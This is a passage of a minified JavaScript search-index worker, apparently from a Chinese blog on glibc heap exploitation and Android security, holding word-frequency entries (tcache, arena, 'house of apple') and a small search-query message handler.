1\":{\"213\":4}}],[\"second\",{\"1\":{\"188\":1,\"195\":1}}],[\"seconds\",{\"1\":{\"43\":2}}],[\"security\",{\"1\":{\"46\":1,\"109\":1}}],[\"seek\",{\"1\":{\"180\":6,\"186\":2}}],[\"seekpos\",{\"1\":{\"180\":6,\"186\":2}}],[\"seekoff\",{\"1\":{\"180\":6,\"186\":2}}],[\"see\",{\"1\":{\"0\":1,\"124\":1,\"127\":1}}],[\"setbuf\",{\"1\":{\"180\":6,\"182\":3,\"186\":2}}],[\"setruntimemsg\",{\"1\":{\"30\":1}}],[\"setimmediate\",{\"1\":{\"17\":1,\"27\":1}}],[\"set\",{\"1\":{\"0\":1,\"65\":2,\"90\":2,\"98\":3,\"100\":1,\"106\":5,\"109\":4,\"124\":1,\"132\":1,\"137\":2,\"138\":2,\"143\":2,\"144\":2,\"182\":2,\"241\":2}}],[\"txt\",{\"1\":{\"189\":1,\"249\":4}}],[\"t的常量数据\",{\"1\":{\"184\":1,\"186\":1}}],[\"tls^xor\",{\"1\":{\"288\":3}}],[\"tls\",{\"1\":{\"163\":1,\"285\":1,\"288\":6}}],[\"tls+0x30\",{\"1\":{\"163\":1,\"285\":1}}],[\"tmux\",{\"1\":{\"154\":1}}],[\"tmp\",{\"1\":{\"127\":6}}],[\"t总长度\",{\"1\":{\"143\":1,\"144\":1}}],[\"tpatload长度\",{\"1\":{\"143\":1,\"144\":1}}],[\"tprev\",{\"1\":{\"143\":1,\"144\":1}}],[\"tbk\",{\"1\":{\"143\":1,\"144\":1}}],[\"tfd\",{\"1\":{\"143\":1,\"144\":1}}],[\"tsize\",{\"1\":{\"143\":1,\"144\":1}}],[\"tsl\",{\"0\":{\"117\":1}}],[\"two\",{\"1\":{\"137\":1,\"182\":1}}],[\"t>\",{\"1\":{\"127\":1}}],[\"type\",{\"1\":{\"77\":1,\"234\":2,\"236\":1}}],[\"typedef\",{\"1\":{\"71\":2,\"176\":1}}],[\"tc\",{\"1\":{\"100\":2,\"109\":4,\"127\":6}}],[\"tcache占满\",{\"1\":{\"276\":1}}],[\"tcache删除完毕\",{\"1\":{\"260\":1}}],[\"tcache在libc2\",{\"1\":{\"127\":1}}],[\"tcache利用\",{\"0\":{\"125\":1}}],[\"tcachebin\",{\"1\":{\"115\":1}}],[\"tcache位于heap最前端\",{\"1\":{\"72\":1}}],[\"tcache\",{\"0\":{\"123\":1,\"127\":1},\"1\":{\"71\":12,\"100\":4,\"109\":6,\"127\":13,\"142\":2,\"143\":1,\"161\":1,\"283\":1}}],[\"tcache缓存的是非large\",{\"1\":{\"70\":1}}],[\"tcache机制\",{\"1\":{\"70\":1}}],[\"tcahe机制\",{\"0\":{\"70\":1}}],[\"tcahe机制+泄露libc地址\",{\"0\":{\"68\":1}}],[\"tcp\",{\"1\":{\"10\":2}}],[\"terminate\",{\"1\":{\"213\":1}}],[\"terminal\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"temp\",{\"1\":{\"109\":2}}],[\"tell\",{\"1\":{\"109\":1}}],[\"tel\",{\"1\":{\"96\":2}}],[\"tencent\",{\"1\":{\"58\":1,\"80\":1}}],[\"text=简介\",{\"1\":{\"48\":1}}],[\"tests\",{\"1\":{\"109\":1}}],[\"testb\",{\"1\":{\"67\":1}}],[\"testa\",{\"1\":{\"67\":1}}],[\"test增加或修改测试用例\",{\"1\":{\"50\":1}}],[\"test2\",{\"1\":{\"19\":1}}],[\"test\",{\"1\":{\"19\":10,\"20\":7,\"27\":1,\"109\":1,\"124\":1,\"127\":1,\"137\":5,\"247\":1,\"271\":2}}],[\"tips\",{\"1\":{\"268\":1}}],[\"times>\",{\"1\":{\"193\":1}}],[\"timeout\",{\"1\":{\"64\":1}}],[\"time\",{\"1\":{\"46\":1,\"71\":1,\"265\":3,\"270\":1,\"273\":2,\"289\":2,\"290\":2}}],[\"tick\",{\"0\":{\"34\":1},\"1\":{\"30\":1}}],[\"trigger\",{\"1\":{\"182\":1}}],[\"trim\",{\"1\":{\"109\":8}}],[\"trouble\",{\"1\":{\"174\":1}}],[\"traversing\",{\"1\":{\"134\":1,\"138\":1}}],[\"transmitted\",{\"1\":{\"46\":1}}],[\"trust\",{\"1\":{\"127\":1}}],[\"true\",{\"1\":{\"0\":1,\"64\":1,\"109\":4,\"248\":1}}],[\"try\",{\"1\":{\"109\":1,\"138\":1,\"276\":1,\"288\":1}}],[\"t\",{\"1\":{\"43\":1,\"109\":11,\"127\":3,\"132\":3,\"136\":1,\"137\":4,\"138\":1,\"174\":4,\"175\":15,\"176\":1,\"180\":18,\"182\":16,\"184\":1,\"186\":22,\"188\":1,\"192\":1,\"193\":15,\"195\":1,\"202\":1,\"213\":4,\"223\":2,\"224\":2,\"226\":2,\"243\":5,\"244\":5,\"246\":1}}],[\"tail命令\",{\"1\":{\"249\":1}}],[\"tail\",{\"1\":{\"223\":1}}],[\"take\",{\"1\":{\"75\":1}}],[\"task启动\",{\"1\":{\"67\":1}}],[\"tags\",{\"1\":{\"47\":1}}],[\"tag\",{\"1\":{\"43\":2}}],[\"targets\",{\"1\":{\"132\":1}}],[\"target\",{\"1\":{\"27\":1}}],[\"third\",{\"1\":{\"188\":1}}],[\"this\",{\"1\":{\"0\":2,\"17\":1,\"18\":1,\"19\":3,\"20\":1,\"21\":4,\"43\":2,\"55\":2,\"71\":1,\"109\":1,\"124\":1,\"127\":1,\"132\":5,\"176\":1,\"179\":5,\"180\":7}}],[\"threshold\",{\"1\":{\"109\":5}}],[\"threads状态\",{\"1\":{\"138\":1}}],[\"threads\",{\"1\":{\"132\":2,\"138\":2}}],[\"threaded\",{\"1\":{\"109\":1}}],[\"thread\",{\"1\":{\"27\":1,\"36\":1,\"71\":3,\"109\":2,\"136\":1,\"138\":2,\"243\":4}}],[\"that\",{\"1\":{\"43\":2,\"71\":1,\"106\":1,\"109\":5,\"124\":3,\"137\":3}}],[\"then\",{\"1\":{\"109\":1}}],[\"they\",{\"1\":{\"109\":2}}],[\"these\",{\"1\":{\"71\":1}}],[\"therefore\",{\"1\":{\"106\":1,\"109\":1}}],[\"there\",{\"1\":{\"71\":1,\"109\":1,\"137\":2}}],[\"the\",{\"1\":{\"0\":1,\"27\":1,\"43\":6,\"71\":2,\"75\":1,\"106\":3,\"109\":29,\"124\":10,\"127\":1,\"132\":7,\"134\":4,\"137\":6,\"138\":11,\"154\":4,\"175\":1,\"176\":3,\"182\":2,\"193\":1,\"202\":3,\"213\":6,\"223\":1,\"254\":1,\"255\":2,\"256\":1}}],[\"tool\",{\"0\":{\"303\":1}}],[\"toolkit\",{\"1\":{\"27\":1}}],[\"too\",{\"1\":{\"137\":1,\"138\":1}}],[\"total\",{\"1\":{\"109\":1}}],[\"topmost\",{\"1\":{\"109\":1,\"132\":1}}],[\"top\",{\"1\":{\"30\":1,\"109\":13,\"114\":1,\"124\":2,\"132\":3,\"138\":5,\"265\":1,\"266\":1,\"268\":1,\"289\":1}}],[\"to\",{\"1\":{\"0\":1,\"27\":3,\"43\":1,\"64\":4,\"106\":2,\"109\":6,\"124\":3,\"127\":1,\"132\":3,\"134\":2,\"137\":4,\"138\":5,\"154\":1,\"175\":4,\"182\":4,\"193\":4,\"202\":2}}],[\"aaaaaaaa\",{\"1\":{\"260\":3,\"276\":1}}],[\"a3\",{\"1\":{\"244\":1}}],[\"a2\",{\"1\":{\"244\":1}}],[\"a1\",{\"1\":{\"244\":1,\"245\":1}}],[\"ax\",{\"1\":{\"218\":2,\"219\":2,\"220\":6}}],[\"amd64\",{\"1\":{\"154\":2,\"254\":1,\"258\":2,\"260\":2,\"264\":2,\"265\":2,\"266\":2,\"267\":2,\"268\":6,\"269\":2,\"271\":1,\"273\":2,\"276\":2,\"288\":2,\"289\":2,\"290\":2}}],[\"above\",{\"1\":{\"132\":1}}],[\"abort\",{\"1\":{\"127\":1,\"208\":1}}],[\"aborting\",{\"1\":{\"127\":1}}],[\"about\",{\"1\":{\"27\":1,\"137\":1}}],[\"anna\",{\"1\":{\"256\":1}}],[\"another\",{\"1\":{\"202\":1}}],[\"anquanke\",{\"1\":{\"157\":1,\"279\":1}}],[\"an\",{\"1\":{\"127\":1,\"134\":1,\"138\":1}}],[\"andfd\",{\"1\":{\"129\":1}}],[\"android中intent\",{\"1\":{\"36\":1,\"39\":1}}],[\"android中application标签说明\",{\"1\":{\"36\":1}}],[\"android安全\",{\"1\":{\"28\":1}}],[\"android\",{\"0\":{\"35\":1,\"293\":1},\"1\":{\"9\":1,\"27\":2,\"30\":3,\"32\":1,\"36\":2,\"37\":2,\"38\":1}}],[\"and\",{\"0\":{\"224\":1},\"1\":{\"0\":1,\"43\":1,\"71\":1,\"106\":1,\"109\":4,\"124\":2,\"130\":1,\"137\":2,\"138\":1,\"175\":1,\"193\":1,\"202\":1,\"268\":1}}],[\"away\",{\"1\":{\"109\":1}}],[\"await\",{\"1\":{\"67\":1}}],[\"acq\",{\"1\":{\"137\":1}}],[\"acquired\",{\"1\":{\"138\":1}}],[\"acquire\",{\"1\":{\"134\":1,\"138\":1}}],[\"access\",{\"1\":{\"132\":3,\"134\":1,\"138\":1,\"180\":1}}],[\"accident\",{\"1\":{\"109\":1}}],[\"actual\",{\"1\":{\"124\":1,\"202\":1}}],[\"actually\",{\"1\":{\"109\":1,\"202\":1}}],[\"action\",{\"1\":{\"39\":5}}],[\"activity\",{\"1\":{\"30\":1,\"38\":1,\"40\":1}}],[\"activities\",{\"1\":{\"30\":1}}],[\"asm\",{\"1\":{\"268\":9}}],[\"ask\",{\"1\":{\"109\":1}}],[\"as\",{\"1\":{\"109\":3,\"124\":1,\"132\":1}}],[\"associated\",{\"1\":{\"109\":1}}],[\"assume\",{\"1\":{\"106\":1,\"137\":1}}],[\"assert\",{\"1\":{\"104\":1,\"109\":1,\"124\":1,\"138\":1}}],[\"async声明的\",{\"1\":{\"67\":1}}],[\"asyncio\",{\"1\":{\"62\":2,\"67\":2}}],[\"asyncio学习\",{\"0\":{\"62\":1}}],[\"available\",{\"1\":{\"137\":1}}],[\"avoid\",{\"1\":{\"106\":1,\"137\":2}}],[\"av\",{\"1\":{\"80\":1,\"90\":3,\"95\":2,\"97\":4,\"98\":8,\"99\":2,\"100\":1,\"102\":1,\"103\":2,\"104\":2,\"106\":4,\"107\":1,\"109\":30,\"120\":1,\"124\":6,\"129\":1}}],[\"avg\",{\"1\":{\"46\":1,\"223\":2}}],[\"after\",{\"1\":{\"69\":1,\"109\":2,\"124\":1}}],[\"af2e5d02e3e8\",{\"1\":{\"43\":1}}],[\"al\",{\"1\":{\"268\":4}}],[\"alex\",{\"1\":{\"183\":1}}],[\"also\",{\"1\":{\"127\":1}}],[\"always\",{\"1\":{\"109\":1,\"137\":1,\"224\":2,\"226\":1,\"227\":1}}],[\"already\",{\"1\":{\"109\":2,\"124\":1,\"127\":1}}],[\"align\",{\"1\":{\"138\":1}}],[\"aligned\",{\"1\":{\"109\":1,\"224\":1,\"227\":1}}],[\"alignment\",{\"1\":{\"109\":1,\"138\":4}}],[\"aliyun\",{\"1\":{\"46\":5,\"48\":2}}],[\"all此时是指向的我们fp\",{\"1\":{\"202\":1}}],[\"all链\",{\"1\":{\"202\":1}}],[\"all指向的stderr则链接后\",{\"1\":{\"188\":1}}],[\"all\",{\"0\":{\"208\":1},\"1\":{\"96\":1,\"132\":1,\"169\":2,\"188\":3,\"202\":3,\"206\":1,\"207\":1}}],[\"allows\",{\"1\":{\"202\":1}}],[\"allowclearuserdata\",{\"1\":{\"37\":1}}],[\"alloc分配\",{\"1\":{\"223\":1}}],[\"allocted\",{\"1\":{\"153\":1}}],[\"alloced\",{\"1\":{\"114\":2}}],[\"allocate\",{\"1\":{\"182\":1}}],[\"allocated\",{\"1\":{\"109\":2,\"132\":1,\"182\":2}}],[\"allocator\",{\"1\":{\"109\":1}}],[\"alloc\",{\"1\":{\"90\":1,\"98\":1,\"100\":1,\"107\":1,\"223\":4,\"224\":2,\"226\":2}}],[\"again\",{\"1\":{\"109\":1,\"174\":1,\"268\":3}}],[\"ago\",{\"1\":{\"43\":7}}],[\"agentalbrazee\",{\"1\":{\"254\":1}}],[\"agent\",{\"1\":{\"30\":8}}],[\"age\",{\"1\":{\"20\":1,\"21\":4}}],[\"atexit函数\",{\"1\":{\"156\":1,\"278\":1}}],[\"atomics\",{\"1\":{\"132\":1}}],[\"atomically\",{\"1\":{\"109\":1,\"124\":1}}],[\"atomic\",{\"1\":{\"109\":2,\"134\":1,\"138\":1}}],[\"attr\",{\"1\":{\"243\":4}}],[\"attempt\",{\"1\":{\"134\":1,\"138\":2}}],[\"attempts\",{\"1\":{\"43\":1}}],[\"attack\",{\"1\":{\"92\":1,\"168\":1}}],[\"attack学习\",{\"0\":{\"92\":1}}],[\"attached\",{\"1\":{\"132\":2}}],[\"attach\",{\"1\":{\"23\":1,\"27\":1,\"273\":1,\"288\":1}}],[\"at\",{\"1\":{\"27\":1,\"90\":2,\"97\":1,\"98\":1,\"100\":1,\"103\":2,\"104\":1,\"106\":2,\"109\":13,\"124\":6,\"127\":1,\"182\":1,\"223\":1,\"249\":1}}],[\"arm\",{\"0\":{\"271\":1},\"1\":{\"271\":3}}],[\"arm64\",{\"1\":{\"27\":1}}],[\"arrow\",{\"1\":{\"249\":1}}],[\"arrive\",{\"1\":{\"109\":1}}],[\"art\",{\"1\":{\"248\":2}}],[\"article\",{\"1\":{\"48\":1}}],[\"arahat0师傅提醒俺\",{\"1\":{\"161\":1,\"283\":1}}],[\"ar\",{\"1\":{\"136\":10}}],[\"arch=\",{\"1\":{\"154\":2,\"258\":2,\"260\":3,\"264\":2,\"265\":2,\"266\":2,\"267\":2,\"268\":10,\"269\":3,\"270\":3,\"271\":3,\"273\":3,\"276\":2,\"288\":2,\"289\":2,\"290\":2}}],[\"arch\",{\"1\":{\"118\":1,\"254\":1}}],[\"around\",{\"1\":{\"109\":1}}],[\"area\",{\"1\":{\"175\":9,\"193\":9}}],[\"arean+88的地址了\",{\"1\":{\"145\":1}}],[\"arean\",{\"1\":{\"132\":2}}],[\"are\",{\"1\":{\"71\":1,\"109\":6,\"124\":2,\"175\":1,\"193\":1}}],[\"arena是在ptamlloc\",{\"1\":{\"136\":1}}],[\"arena设置成main\",{\"1\":{\"136\":1}}],[\"arena满了调用reused\",{\"1\":{\"135\":1}}],[\"arena函数中\",{\"1\":{\"133\":1}}],[\"arenas\",{\"1\":{\"132\":1,\"137\":1}}],[\"arena然后双向链表\",{\"1\":{\"128\":1}}],[\"arena+48\",{\"1\":{\"142\":1}}],[\"arena+152\",{\"1\":{\"96\":2}}],[\"arena+144\",{\"1\":{\"96\":2}}],[\"arena+136\",{\"1\":{\"96\":2}}],[\"arena+128\",{\"1\":{\"96\":6}}],[\"arena+120\",{\"1\":{\"96\":2}}],[\"arena+112\",{\"1\":{\"96\":10}}],[\"arena+104\",{\"1\":{\"96\":2}}],[\"arena+96这个位置\",{\"1\":{\"96\":1}}],[\"arena+96\",{\"1\":{\"96\":9}}],[\"arena+88的位置\",{\"1\":{\"142\":1}}],[\"arena+88\",{\"1\":{\"72\":1,\"142\":1}}],[\"arena\",{\"0\":{\"136\":1,\"137\":1,\"138\":2,\"139\":1},\"1\":{\"90\":2,\"98\":2,\"104\":1,\"106\":4,\"109\":3,\"131\":1,\"132\":5,\"133\":1,\"134\":6,\"135\":4,\"136\":10,\"137\":13,\"138\":16}}],[\"arena的值\",{\"1\":{\"138\":1}}],[\"arena的地址\",{\"1\":{\"72\":1}}],[\"arena的实际地址\",{\"1\":{\"69\":1}}],[\"arena中获取分配区\",{\"1\":{\"136\":1}}],[\"arena中\",{\"1\":{\"69\":1}}],[\"argv\",{\"1\":{\"255\":2}}],[\"argc\",{\"1\":{\"255\":2}}],[\"arg参数作为参数这里plt\",{\"1\":{\"234\":1}}],[\"arg\",{\"1\":{\"66\":1,\"234\":4,\"243\":2}}],[\"args\",{\"1\":{\"20\":1,\"21\":1,\"23\":1,\"30\":2,\"32\":1,\"264\":3}}],[\"arguments\",{\"1\":{\"19\":2,\"27\":1}}],[\"apt\",{\"1\":{\"46\":1}}],[\"appear\",{\"1\":{\"109\":1}}],[\"append\",{\"1\":{\"64\":1,\"276\":1,\"288\":1}}],[\"apple1原理\",{\"0\":{\"169\":1}}],[\"apple\",{\"0\":{\"166\":1,\"178\":1},\"1\":{\"167\":3,\"178\":1,\"182\":1,\"252\":2}}],[\"apples\",{\"0\":{\"84\":1,\"146\":1}}],[\"application的入口\",{\"1\":{\"39\":1}}],[\"application\",{\"1\":{\"37\":2}}],[\"application标签引用class内容\",{\"1\":{\"36\":1}}],[\"application标签大致说明\",{\"1\":{\"36\":1}}],[\"apply\",{\"1\":{\"19\":1}}],[\"appdata\",{\"1\":{\"27\":1}}],[\"apk文件大致结构\",{\"1\":{\"36\":1}}],[\"apk\",{\"1\":{\"14\":2}}],[\"a+b\",{\"1\":{\"19\":1}}],[\"a=123\",{\"1\":{\"17\":1,\"19\":1}}],[\"add后\",{\"1\":{\"152\":1}}],[\"add一个比chunk\",{\"1\":{\"150\":1,\"154\":1}}],[\"add函数\",{\"1\":{\"141\":1,\"156\":1,\"278\":1}}],[\"adding\",{\"1\":{\"109\":1,\"124\":1}}],[\"addemo函数内部\",{\"1\":{\"77\":1}}],[\"addr段\",{\"1\":{\"260\":1}}],[\"addr^res\",{\"1\":{\"165\":1,\"287\":1}}],[\"addr就是取fs放在什么地方\",{\"1\":{\"118\":1}}],[\"address\",{\"1\":{\"109\":1,\"137\":1,\"182\":4}}],[\"addr\",{\"1\":{\"23\":1,\"96\":1,\"118\":1,\"165\":10,\"182\":13,\"231\":1,\"241\":1,\"258\":5,\"260\":11,\"264\":12,\"270\":1,\"273\":1,\"276\":6,\"287\":10,\"288\":5,\"289\":4,\"290\":2}}],[\"addr=module\",{\"1\":{\"23\":1}}],[\"add\",{\"1\":{\"17\":2,\"19\":1,\"23\":2,\"65\":1,\"109\":2,\"124\":1,\"134\":1,\"138\":1,\"141\":1,\"143\":3,\"144\":3,\"150\":12,\"151\":2,\"152\":2,\"153\":3,\"154\":21,\"158\":2,\"161\":5,\"162\":1,\"163\":6,\"165\":12,\"265\":3,\"268\":1,\"269\":2,\"273\":15,\"276\":10,\"280\":2,\"283\":5,\"284\":1,\"285\":6,\"287\":12,\"288\":41}}],[\"add方法\",{\"1\":{\"17\":1}}],[\"adb\",{\"1\":{\"10\":1,\"29\":1,\"30\":1}}],[\"a\",{\"1\":{\"0\":1,\"17\":3,\"19\":4,\"20\":3,\"27\":1,\"43\":1,\"106\":2,\"109\":6,\"124\":2,\"127\":3,\"132\":3,\"134\":3,\"137\":9,\"138\":21,\"143\":1,\"144\":1,\"150\":12,\"151\":2,\"152\":1,\"153\":2,\"154\":17,\"158\":2,\"161\":5,\"162\":1,\"163\":3,\"165\":6,\"195\":2,\"202\":1,\"255\":5,\"256\":1,\"258\":2,\"260\":2,\"264\":1,\"265\":1,\"266\":2,\"270\":1,\"271\":2,\"273\":4,\"276\":6,\"280\":2,\"283\":5,\"284\":1,\"285\":3,\"287\":6,\"288\":14,\"289\":1,\"290\":1}}]],\"serializationVersion\":2}}")).map(([e,t])=>[e,zt(t,{fields:["h","t","c"],storeFields:["h","t","c"]})]));self.onmessage=({data:{type:e="all",query:t,locale:s,options:n}})=>{e==="suggest"?self.postMessage(st(t,v[s],n)):e==="search"?self.postMessage(et(t,v[s],n)):self.postMessage({suggestions:st(t,v[s],n),results:et(t,v[s],n)})};
//# sourceMappingURL=index.js.map
